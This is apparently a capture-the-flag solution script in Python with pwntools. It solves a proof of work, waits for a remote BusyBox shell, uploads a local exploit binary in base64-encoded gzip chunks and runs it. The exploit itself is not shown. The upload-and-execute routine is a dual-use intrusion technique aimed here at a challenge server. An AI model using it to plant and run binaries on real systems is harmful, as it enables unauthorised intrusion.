#!/usr/bin/env python3
from pwn import *
import subprocess
import base64
import gzip
import os
import re
import sys
import time

HOST = "throughthewall.opus4-7.b01le.rs"
PORT = 8443

context.log_level = "info"

POW_BIN = os.path.expanduser("~/.cache/redpwnpow/redpwnpow-v0.1.2-linux-amd64")
ANSI_RE = re.compile(rb'\x1b(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')


def solve_pow(io, timeout=900):
    io.recvuntil(b"proof of work:\n")
    cmd = io.recvline().strip().decode()
    log.info(f"PoW cmd from server: {cmd}")

    token = cmd.split()[-1]
    log.info(f"PoW token: {token}")

    if not os.path.exists(POW_BIN):
        raise FileNotFoundError(
            f"Missing PoW binary: {POW_BIN}\n"
            "Download it first with:\n"
            "mkdir -p ~/.cache/redpwnpow && "
            "curl -fL -o ~/.cache/redpwnpow/redpwnpow-v0.1.2-linux-amd64 "
            "https://github.com/redpwn/pow/releases/download/v0.1.2/redpwnpow-linux-amd64 && "
            "chmod +x ~/.cache/redpwnpow/redpwnpow-v0.1.2-linux-amd64"
        )

    proc = subprocess.run(
        [POW_BIN, token],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=timeout,
        check=True,
    )

    if proc.stderr:
        log.info(proc.stderr.decode(errors="ignore"))

    sol = proc.stdout.strip().splitlines()[-1].strip()
    log.success(f"PoW solution: {sol.decode(errors='ignore')}")
    io.sendlineafter(b"solution: ", sol)


def wait_for_shell(io, timeout=60):
    """
    Wait until the BusyBox shell prompt appears.
    Remote emits ANSI junk like '\\x1b[6n', so strip ANSI before checking.
    """
    deadline = time.time() + timeout
    buf = b""

    while time.time() < deadline:
        try:
            chunk = io.recv(timeout=1)
        except EOFError:
            raise EOFError("remote closed before shell prompt appeared")

        if not chunk:
            continue

        buf += chunk
        cleaned = ANSI_RE.sub(b"", buf)

        # print boot logs as they arrive
        sys.stdout.buffer.write(chunk)
        sys.stdout.buffer.flush()

        tail = cleaned[-256:]

        if (
            b"~ $ " in tail
            or b"/ $ " in tail
            or tail.rstrip().endswith(b"$")
            or tail.rstrip().endswith(b"#")
        ):
            log.success("Shell prompt detected")
            return

    raise TimeoutError("Timed out waiting for remote shell prompt")


def recv_marker_line(io, marker, timeout=30, echo=False):
    marker_line = rb"(?:^|\r?\n)" + re.escape(marker) + rb"\r?\n"
    deadline = time.time() + timeout
    buf = b""

    while time.time() < deadline:
        chunk = io.recv(timeout=1)
        if not chunk:
            continue
        buf += chunk
        if echo:
            sys.stdout.buffer.write(chunk)
            sys.stdout.buffer.flush()
        if re.search(marker_line, buf):
            return buf

    raise TimeoutError(f"Timed out waiting for marker line {marker!r}")


def upload_exploit(io, local_path, remote_path="/tmp/exploit"):
    with open(local_path, "rb") as f:
        blob = f.read()

    blob_gz_b64 = base64.encodebytes(gzip.compress(blob, compresslevel=9)).decode()

    marker = b"__UP__"
    eof = "__EOF_GZ_B64__"
    batch_chars = 2048

    log.info(f"Uploading {local_path} -> {remote_path} ({len(blob_gz_b64)} base64 bytes, gzipped)")
    io.clean(0.2)

    io.sendline(f": > {remote_path}.b64; printf '\\n{marker.decode()}\\n'".encode())
    recv_marker_line(io, marker, timeout=15)

    total_batches = (len(blob_gz_b64) + batch_chars - 1) // batch_chars
    for idx, off in enumerate(range(0, len(blob_gz_b64), batch_chars), 1):
        chunk = blob_gz_b64[off:off + batch_chars]
        payload = (
            f"cat >> {remote_path}.b64 <<'{eof}'\n"
            f"{chunk}\n"
            f"{eof}\n"
            f"wc -c < {remote_path}.b64\n"
            f"printf '\\n{marker.decode()}\\n'\n"
        ).encode()
        io.send(payload)
        data = recv_marker_line(io, marker, timeout=30)
        cleaned = ANSI_RE.sub(b"", data)
        values = re.findall(rb"(?m)^\s*(\d+)\s*$", cleaned)
        if not values:
            raise ValueError(f"Could not parse uploaded size after batch {idx}")
        uploaded_b64 = int(values[-1])
        log.info(f"uploaded batch {idx}/{total_batches} ({uploaded_b64}/{len(blob_gz_b64)} base64 bytes)")

    io.sendline(
        (
            f"base64 -d {remote_path}.b64 | gzip -d > {remote_path}; "
            f"chmod u+x {remote_path}; "
            f"wc -c < {remote_path}; "
            f"printf '\\n{marker.decode()}\\n'"
        ).encode()
    )
    data = recv_marker_line(io, marker, timeout=120)
    cleaned = ANSI_RE.sub(b"", data)
    values = re.findall(rb"(?m)^\s*(\d+)\s*$", cleaned)
    if not values:
        raise ValueError(f"Could not parse uploaded size for {remote_path}")
    uploaded = int(values[-1])
    log.info(f"uploaded {uploaded} bytes to {remote_path}")


def run_and_capture(io, cmd, marker="__DONE__", timeout=60):
    io.clean(0.2)
    io.sendline(f"{cmd}; printf '\\n{marker}\\n'".encode())
    want = f"\r\n{marker}\r\n".encode()
    deadline = time.time() + timeout
    buf = b""

    while time.time() < deadline:
        chunk = io.recv(timeout=1)
        if not chunk:
            continue
        buf += chunk
        sys.stdout.buffer.write(chunk)
        sys.stdout.buffer.flush()
        if want in buf:
            return buf

    raise TimeoutError(f"Timed out waiting for marker after command: {cmd}")


def main():
    local_exploit = sys.argv[1] if len(sys.argv) > 1 else "exploit"

    io = remote(HOST, PORT, ssl=True)

    solve_pow(io)
    wait_for_shell(io, timeout=90)

    upload_exploit(io, local_exploit)

    run_and_capture(io, "echo ping", timeout=15)
    run_and_capture(io, "ls -l /tmp/exploit", timeout=15)
    run_and_capture(io, "timeout 30 /tmp/exploit", timeout=45)


if __name__ == "__main__":
    main()
